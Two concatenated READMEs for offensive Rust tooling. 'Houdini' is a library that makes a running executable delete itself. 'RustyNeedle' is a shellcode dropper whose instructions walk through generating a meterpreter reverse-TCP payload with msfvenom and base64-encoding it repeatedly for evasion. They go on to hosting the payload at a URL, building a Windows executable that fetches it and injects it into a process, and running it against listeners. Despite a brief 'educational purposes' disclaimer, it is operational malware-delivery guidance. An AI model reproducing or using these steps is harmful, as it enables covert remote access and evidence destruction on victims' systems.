# Houdini
`Houdini` is a rust library that allows you to delete your executable while it's running.  

This is fairly straightforward for unix systems, since the executable is released after getting mapped to the memory. 
We just need to find where it is and unlink it.

On Windows, we use a method discovered by [@jonasLyk](https://twitter.com/jonasLyk/status/1350401461985955840). 
My implementation heavily references [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)'s Nim implementation in [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/self_delete_bin.nim)
and in turn LloydLabs' initial [`C` PoC](https://github.com/LloydLabs/delete-self-poc).

## Usage

```rust
// With a default placeholder value on windows (`svcmsrpc`)
use houdini;

fn main() {
    match houdini::disappear() {
        Ok(_) => println!("Pulled a Houdini!!"),
        Err(e) => println!("Nope! => {}", e),
    };
}
```

```rust
// With a placeholder you provide
use houdini::disappear;

fn main() {
    #[cfg(target_os = "windows")]
    match houdini::disappear_with_placeholder("temporary") {
        Ok(_) => println!("Pulled a Houdini!!"),
        Err(e) => println!("Nope! => {}", e),
    };
}
```

# RustyNeedle

**THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY. I take no responsibility if you decide to do crimes with this code.**

A simple dropper for shellcode that leverages the power of...base64 encoding??

No seriously. And it works. Here's how:

## Usage

1. Create your shellcode however you like, be it with `msfvenom` or other tools. Export the raw shellcode file.

2. Use the encode.py script provided in this repository to create an encoded version of the shellcode. 

```bash
python3 encode.py [SHELLCODE_FILE] [B64_ITERATIONS] [OUT_FILE]
```

### Arguments

* `SHELLCODE_FILE`: raw shellcode file to encode
* `B64_ITERATIONS`: # of times to base64-encode the shellcode
* `OUT_FILE`: Resulting text file of the encoded shellcode. **NOTE:** this will be many times larger than the source!

### Alternative usage

If you don't want to use the script, you can also encode raw shellcode from `msfvenom`. It would go something like this:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw | base64 -w 0 > note.txt
# Pipe to base64 -w 0 as many times as you want to iterate the encoding
```
3. Edit the source code in `src/main.rs` to reflect the `URL` where the encoded shellcode will be hosted. Make sure `B64_TTERATIONS` matches what you created with `encode.py`. If you wish to use remote injection, change the `PROCESS_NAME` value as well.

4. Run `cargo build --target x86_64-pc-windows-gnu --release`. If building on Linux for Windows, make sure you've added the Windows target triple with `rustup target add x86_64-pc-windows-gnu`.

5. Copy the resulting exe in `target/x86_64-pc-windows-gnu/release/rustyneedle.exe` wherever you like.

6. Set up any listeners, then execute the dropper!

